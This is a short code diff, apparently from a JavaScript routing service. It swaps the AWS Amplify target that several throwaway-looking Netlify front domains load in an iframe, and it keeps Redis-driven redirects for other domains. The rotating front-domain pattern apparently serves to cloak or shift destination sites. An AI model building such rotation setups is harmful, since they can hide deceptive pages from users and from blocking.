@@ -109,14 +109,14 @@ async function getRotationTarget(key) {
 //                    embed it in an iframe (target is ignored)
 const ORIGIN_GROUPS = {
   rocky: {
-    "https://aquamarine-cascaron-959598.netlify.app": { method: "iframe", target: "https://main.d2ytdcu9zzrla0.amplifyapp.com" },
-    "https://polite-cat-d0b08d.netlify.app": { method: "iframe", target: "https://main.d2ytdcu9zzrla0.amplifyapp.com" },
-    "https://heroic-unicorn-b2bbb8.netlify.app": { method: "iframe", target: "https://main.d2ytdcu9zzrla0.amplifyapp.com" },
-    "https://singular-fairy-efaa38.netlify.app": { method: "iframe", target: "https://main.d2ytdcu9zzrla0.amplifyapp.com" },
+    "https://aquamarine-cascaron-959598.netlify.app": { method: "iframe", target: "https://main.d21c2bu94taqqi.amplifyapp.com" },
+    "https://polite-cat-d0b08d.netlify.app": { method: "iframe", target: "https://main.d21c2bu94taqqi.amplifyapp.com" },
+    "https://heroic-unicorn-b2bbb8.netlify.app": { method: "iframe", target: "https://main.d21c2bu94taqqi.amplifyapp.com" },
+    "https://singular-fairy-efaa38.netlify.app": { method: "iframe", target: "https://main.d21c2bu94taqqi.amplifyapp.com" },
     "https://hiroakitravels.com": { method: "redirect", target: AMPLIFY_URL_FALLBACK, redisKey: KEY_AMPLIFY_URL },
     "https://teruogames.org": { method: "redirect", target: AMPLIFY_URL_FALLBACK, redisKey: KEY_AMPLIFY_URL },
-    "https://funny-chebakia-1d7840.netlify.app": { method: "iframe", target: "https://main.d2ytdcu9zzrla0.amplifyapp.com" }, // teruogames link
-    "https://silly-cucurucho-09bda3.netlify.app": { method: "iframe", target: "https://main.d2ytdcu9zzrla0.amplifyapp.com" }, // teruogames link
+    "https://funny-chebakia-1d7840.netlify.app": { method: "iframe", target: "https://main.d21c2bu94taqqi.amplifyapp.com" }, // teruogames link
+    "https://silly-cucurucho-09bda3.netlify.app": { method: "iframe", target: "https://main.d21c2bu94taqqi.amplifyapp.com" }, // teruogames link
   },
   dmc: {
     // "https://middlepage.onrender.com/?gclid=twygyuewewewgvehwwhdwdwhdjwdhgwdsuidwdwd": { method: "iframe", target: "https://dmc1-environment.onrender.com" },
